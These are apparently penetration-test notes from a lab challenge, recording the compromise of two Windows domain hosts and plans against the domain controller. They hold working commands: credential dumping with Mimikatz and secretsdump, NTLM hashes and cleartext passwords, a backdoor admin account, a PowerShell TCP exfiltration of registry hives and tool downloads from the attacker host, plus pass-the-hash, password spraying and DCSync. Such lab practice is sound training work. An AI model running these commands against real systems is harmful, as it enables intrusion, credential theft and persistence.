# Secura Challenge - Penetration Test Notes

## Network Overview

| IP Address | Hostname | Role | Status |
|------------|----------|------|--------|
| 192.168.179.95 | SECURE.secura.yzx | Domain Member | COMPROMISED - SYSTEM |
| 192.168.179.96 | ERA.secura.yzx | Domain Member | COMPROMISED - Local Admin (apache) |
| 192.168.179.97 | DC01.secura.yzx | Domain Controller | Identified |
| 192.168.45.229 | Kali | Attacker | - |

## Domain Information

- **Domain:** secura.yzx
- **DC:** dc01.secura.yzx (192.168.179.97)
- **Domain Computers:** ERA$, SECURE$

## Domain Users (from `net user /domain`)

- Administrator (Domain Admin, Enterprise Admin, Schema Admin)
- charlotte
- eric.wallows
- michael
- krbtgt
- Guest
- DefaultAccount

---

## SECURE (192.168.179.95) - Compromised Host

### Initial Access

- **Vector:** ManageEngine AppManager14 exploitation
- **Shell Location:** `C:\Program Files\ManageEngine\AppManager14\working`
- **Access Level:** NT AUTHORITY\SYSTEM

### Proof Flag

```
c134ecd0810577a4de6d2d4a01fc5a1c
```
Location: `C:\Users\Administrator\Desktop\proof.txt`

### System Information

```
Domain: secura.yzx
Hostname: SECURE
```

### Privileges (as SYSTEM)

Key enabled privileges:
- SeDebugPrivilege
- SeImpersonatePrivilege
- SeTcbPrivilege
- SeCreateGlobalPrivilege

### Local Users

| User | Groups | Notes |
|------|--------|-------|
| Administrator | Administrators | Local admin, enabled, password set to `password123!` |
| crack | Administrators, Remote Desktop Users, Remote Management Users | Created during engagement |
| Guest | - | Disabled |
| DefaultAccount | - | Default |
| WDAGUtilityAccount | - | Default |

### Stored Credentials

```
cmdkey /list
Target: Domain:batch=TaskScheduler:Task:{9EF6DE59-80B5-40A1-993B-4C80A0A07233}
Type: Domain Password
User: SECURE\Administrator
```

### Mimikatz Credential Manager Dump

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 722086 (00000000:000b04a6)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SECURE
    msv :
     * Username : Administrator
     * Domain   : SECURE
     * NTLM     : a51493b0b06e5e35f855245e71af1d14
    credman :
     [00000000]
     * Username : apache
     * Domain   : era.secura.local
     * Password : New2Era4.!        <-- KEY FINDING: ERA local creds
```

This credential led to lateral movement to ERA (.96).

### Interesting Files

- `C:\Users\Administrator\dns.ps1` - DNS configuration script pointing to .97 as DNS server
- `C:\Program Files\ManageEngine\AppManager14\working\20251212022831_BloodHound.zip` - BloodHound collection

---

## ERA (192.168.179.96) - Compromised Host

### Initial Access

- **Vector:** Credential reuse - apache local account found in Credential Manager on SECURE
- **Credentials:** apache:New2Era4.! (stored for era.secura.local)
- **Access Method:** WinRM with `--local-auth` flag (critical - domain auth failed)
- **Access Level:** Local Administrator

### Attack Sequence

```bash
# Domain auth FAILED
crackmapexec smb 192.168.179.96 -u apache -p 'New2Era4.!'
# STATUS_LOGON_FAILURE

crackmapexec winrm 192.168.179.96 -u apache -p 'New2Era4.!'
# [-] secura.yzx\apache:New2Era4.!

# Local auth SUCCESS
crackmapexec winrm 192.168.179.96 -u apache -p 'New2Era4.!' --local-auth
# [+] ERA\apache:New2Era4.! (Pwn3d!)

# Shell obtained
evil-winrm -i 192.168.179.96 -u apache -p 'New2Era4.!'
```

### Key Lesson

The credential was stored for `era.secura.local` in Credential Manager, indicating a **LOCAL** account on ERA, not a domain account. The `--local-auth` flag was essential.

### Proof Flag

```
(pending)
```
Location: `C:\Users\Administrator\Desktop\proof.txt` or user desktop

### Next Steps on ERA

1. Grab flags (local.txt, proof.txt)
2. Run Mimikatz for credential extraction
3. Connect to MariaDB locally (was blocked by host ACL from external)
4. Enumerate for DC pivot opportunities

---

## Credential Dumps

### Local SAM Hashes (from secretsdump)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a51493b0b06e5e35f855245e71af1d14:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
crack:1002:aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca:::
```

### Machine Account

```
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:6c97cc424a9811e3d5f9f3d19a69bd95
```

### DPAPI Keys

```
dpapi_machinekey:0x9aacf2053358fe54153ab16c4ee50b08efc72f48
dpapi_userkey:0xe2328bc9bb89ee0c21b62f86a6f6b438ad9c54cd
```

---

## Commands Executed

### Persistence & Pivoting Setup

```powershell
# Create local admin user
net user crack password123! /add
net localgroup administrators crack /add
net localgroup "Remote Desktop Users" crack /add
net localgroup "Remote Management Users" crack /add

# Enable built-in Administrator
net user Administrator password123! /active:yes

# Disable UAC remote restrictions (enables PSExec for local admins)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

### Registry Dump for Offline Cracking

```powershell
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
reg save HKLM\SECURITY security.bak
```

### Exfiltration (PowerShell TCP)

```powershell
$client = New-Object System.Net.Sockets.TcpClient('192.168.45.229',9003)
$stream = $client.GetStream()
$data = [IO.File]::ReadAllBytes('system.bak')
$stream.Write($data, 0, $data.Length)
$stream.Close()
$client.Close()
```

### Offline Extraction (Kali)

```bash
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL
```

### Domain Enumeration

```powershell
# Domain info
systeminfo | findstr Domain
nltest /dclist:secura.yzx
nslookup -type=srv _ldap._tcp.dc._msdcs.secura.yzx

# Domain users
net user /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain

# Resolve hosts
nslookup era.secura.yzx
nslookup secure.secura.yzx

# Network discovery
arp -a
route print
```

### Tool Downloads

```powershell
# Rubeus
iwr http://192.168.45.229/windows-privesc/Rubeus.exe -OutFile r.exe

# Mimikatz (attempted)
iwr http://192.168.45.229/windows-privesc/Invoke-Mimikatz.ps1 -OutFile m.ps1
```

---

## Next Steps / Recommendations

### Lateral Movement to ERA (192.168.179.96)

```bash
# Test connectivity
Test-NetConnection 192.168.179.96 -Port 445
Test-NetConnection 192.168.179.96 -Port 5985
Test-NetConnection 192.168.179.96 -Port 3389

# Try local admin hash (Pass-the-Hash)
impacket-psexec -hashes :a51493b0b06e5e35f855245e71af1d14 Administrator@192.168.179.96

# Try machine account
impacket-psexec -hashes :6c97cc424a9811e3d5f9f3d19a69bd95 'SECURE$'@192.168.179.96
```

### Attack Domain Controller (192.168.179.97)

```bash
# If domain creds obtained
impacket-secretsdump secura.yzx/Administrator:'password'@192.168.179.97

# DCSync (requires domain admin)
impacket-secretsdump secura.yzx/Administrator:'password'@192.168.179.97 -just-dc
```

### Kerberos Attacks (from SECURE)

```powershell
# Kerberoasting
.\r.exe kerberoast /outfile:kerberoast.txt

# AS-REP Roasting
.\r.exe asreproast

# List tickets
.\r.exe triage
```

### Additional Enumeration

```powershell
# Check for cached domain credentials
Invoke-Mimikatz -DumpCreds

# DPAPI credential extraction
Invoke-Mimikatz -Command '"dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\*"'

# Check scheduled tasks for stored creds
schtasks /query /fo LIST /v
```

---

## Attack Attempts

### PSExec to SECURE - SUCCESS

```bash
impacket-psexec Administrator:'password123!'@192.168.179.95
# Result: SYSTEM shell obtained
```

### Kerberoasting - NO RESULTS

```powershell
.\r.exe kerberoast
# [X] No results returned by LDAP!
# No accounts with SPNs found in domain
```

### AS-REP Roasting - NO RESULTS

```powershell
.\r.exe asreproast /format:hashcat /outfile:asrep.txt
# [X] No results returned by LDAP!
# No accounts with "Do not require Kerberos preauthentication" found
```

### Share Enumeration

**ERA (192.168.179.96):**
```powershell
net view \\192.168.179.96
# There are no entries in the list.
```

**DC01 (192.168.179.97):**
```powershell
net view \\192.168.179.97
# Share name  Type  Comment
# NETLOGON    Disk  Logon server share
# SYSVOL      Disk  Logon server share
# test        Disk  <-- INTERESTING, NON-DEFAULT SHARE
```

**SYSVOL Contents:**
```powershell
dir \\dc01.secura.yzx\SYSVOL
# secura.yzx [JUNCTION]
```

**NETLOGON Contents:**
```powershell
dir \\dc01.secura.yzx\NETLOGON
# Empty
```

### Next: Enumerate "test" Share on DC

```powershell
dir \\dc01.secura.yzx\test
```

---

## Files Retrieved

- `sam.bak` - Local SAM database
- `system.bak` - SYSTEM hive (contains boot key)
- `security.bak` - SECURITY hive (contains LSA secrets)
- `20251212022831_BloodHound.zip` - BloodHound collection (on target)

---

## Credentials Summary

| Account | Type | Hash/Password | Source |
|---------|------|---------------|--------|
| SECURE\Administrator | Local | a51493b0b06e5e35f855245e71af1d14 | SAM dump |
| SECURE\Administrator | Local | password123! (set) | Manual |
| crack | Local | password123! | Created |
| SECURE$ | Machine | 6c97cc424a9811e3d5f9f3d19a69bd95 | LSA secrets |
| ERA\apache | Local | New2Era4.! | Mimikatz credman on .95 |
| secura.yzx\ERIC.WALLOWS | Domain | EricLikesRunning800 | Found on .95 |

---

## Nmap Results Summary

### SECURE (192.168.179.95)

| Port | Service | Notes |
|------|---------|-------|
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | |
| 445 | SMB | |
| 3389 | RDP | Remote Desktop |
| 5001 | HTTP | ManageEngine related |
| 5985 | WinRM | Windows Remote Management |
| 8443 | HTTPS | **ManageEngine AppManager** (Initial Access) |
| 12000 | Unknown | ManageEngine related |

### ERA (192.168.179.96)

| Port | Service | Notes |
|------|---------|-------|
| 135 | MSRPC | Windows RPC |
| 139 | NetBIOS | |
| 445 | SMB | |
| **3306** | **MySQL** | **MariaDB 10.3.24 - POTENTIAL ATTACK VECTOR** |
| 5985 | WinRM | Windows Remote Management |

### DC01 (192.168.179.97)

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Domain DNS |
| 88 | Kerberos | |
| 135 | MSRPC | |
| 139 | NetBIOS | |
| 389 | LDAP | AD LDAP |
| 445 | SMB | |
| 464 | kpasswd5 | Kerberos password change |
| 593 | RPC over HTTP | |
| 636 | LDAPS | |
| 3268 | Global Catalog | |
| 3269 | Global Catalog SSL | |
| 5985 | WinRM | |

---

## Machine Account Authentication - SUCCESS

```bash
crackmapexec smb 192.168.179.97 -u 'SECURE$' -H 6c97cc424a9811e3d5f9f3d19a69bd95
# [+] secura.yzx\SECURE$:6c97cc424a9811e3d5f9f3d19a69bd95
```

### Share Access with Machine Account

```
NETLOGON - READ
SYSVOL   - READ
test     - READ (empty)
```

### GPP Password Search

```bash
crackmapexec smb 192.168.179.97 -u 'SECURE$' -H 6c97cc424a9811e3d5f9f3d19a69bd95 -M gpp_password
# Found: secura.yzx/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Services/Services.xml
# Result: Only WinRM config, no cpassword
```

### Local Admin Hash Reuse - FAILED

```bash
crackmapexec smb 192.168.179.96 -u Administrator -H a51493b0b06e5e35f855245e71af1d14 --local-auth
# STATUS_LOGON_FAILURE - Different local admin password on ERA
```

---

## Outstanding Attack Vectors

### 1. MySQL on ERA (192.168.179.96:3306) - RESOLVED

**Status:** ERA compromised via WinRM. Can now access MariaDB locally.

```bash
# From evil-winrm shell on ERA, connect locally:
mysql -u apache -p'New2Era4.!'
mysql -u root -p
```

MariaDB host ACL blocked external connections - required local access.

### 2. Password Spray Domain Users

```bash
crackmapexec smb 192.168.179.97 -u michael charlotte eric.wallows -p 'Password1' 'Welcome1' 'Secura2022' -d secura.yzx --continue-on-success
```

### 3. Analyze Existing BloodHound Data

Pull `C:\Program Files\ManageEngine\AppManager14\working\20251212022831_BloodHound.zip` from SECURE and analyze in BloodHound for attack paths.

### 4. DC Attack - NEXT TARGET

With 2/3 hosts compromised, focus on DC01 (192.168.179.97):
- Try ERIC.WALLOWS domain creds against DC
- Extract creds from ERA via Mimikatz
- Check MariaDB for stored credentials
- Look for DC pivot opportunities on ERA
